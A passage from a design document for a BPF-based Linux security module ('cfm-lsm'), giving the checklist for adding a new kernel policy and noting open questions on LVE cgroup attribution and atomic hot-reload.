The shipped translation unit `internal/lsm/bpf/cfmlsm.bpf.c` holds
every policy. Adding one is a single PR shaped like the existing
ones (e.g. the CRED-003 PR that landed on top of CRED-002):

1. Add the `PolicyID` constant and an `AllPolicies()` entry in
   `internal/lsm/policy.go`. Default mode is `ModeDisabled`.
2. Add the matching `CFM_LSM_POLICY_*` value to
   `internal/lsm/bpf/common.bpf.h`. Values are stable across
   releases — operators reference them in `lsm.conf` and audit
   logs.
3. Write the new BPF program in `cfmlsm.bpf.c`. Reuse the existing
   ringbuf, helpers, and (if relevant) the `cfm_watched_uids` /
   `cfm_watched_inodes` / `cfm_setuid_inodes` maps before adding
   new ones.
4. Wire the program into `loader.go::programFor` and
   `loader.go::pinLinkFile`. Add the `pinFileLink*` constant.
5. Regenerate the BPF artifacts: `make bpf`. Both per-arch
   `cfmlsm_*_bpfel.{go,o}` files must update.
6. Update `events.go` if the wire format changed. Keep
   `TestPolicyByID_BPFConstantsMatchGoConstants` passing.
7. Extend `configs/lsm.conf` with a stanza for the new ID — the
   shipped template is the authoritative starting point operators
   install at `/etc/cfm/lsm.conf`. The `FormatConf` round-trip in
   the test suite also iterates `AllPolicies()`, so omitting the
   new ID from the catalogue would surface as a test failure even
   without a manual edit.
8. If the new policy needs an LSM hook that the kernel may not
   expose as a tracing target (as with CRED-003's
   `fentry/commit_creds`), report it through preflight as a
   per-policy `unavailable` rather than failing the whole
   component.

`cfm lsm probe`, `cfm lsm enable`, `cfm lsm disable`, and the
daemon's adoption path all iterate `AllPolicies()`, so they
pick up the new policy with no further changes.

## Open questions

1. **cgroup → vhost resolution under CloudLinux LVE.** LVE entities
   are not stock cgroups v2. None of the shipped policies is
   vhost-keyed, so this does not block anything today; it remains
   open for any future policy that would need per-vhost attribution.

2. **Policy hot-reload via dual-attach / atomic swap.** Today a
   mode change requires `cfm lsm disable` + re-enable, which briefly
   detaches the kernel-side programs. An atomic swap (load new
   program, replace link, detach old) would close that window but
   needs explicit design before being introduced.

## References

- [`docs/kernsec.md`](./kernsec.md) — preemptive kernel-surface
  reduction (sibling component).
- [`docs/webdetector-history-design.md`](./webdetector-history-design.md)
  — upstream consumer of LSM events.
- [`cfm-php.md`](./cfm-php.md) — future complementary component
  (PHP Zend extension), separate project.
- `internal/outbound/analyzer.go` — existing per-uid NFLOG outbound
  observer; rightful owner of the network-policy problem space.
- `internal/kernsec/profile.go` — host-profile detection reused by
  `cfm-lsm`. See line 188 for the `kernel.yama.ptrace_scope=1`
  default that subsumes the original draft's `CFML-OBS-001`.
- BPF LSM kernel docs: `Documentation/bpf/prog_lsm.rst`.
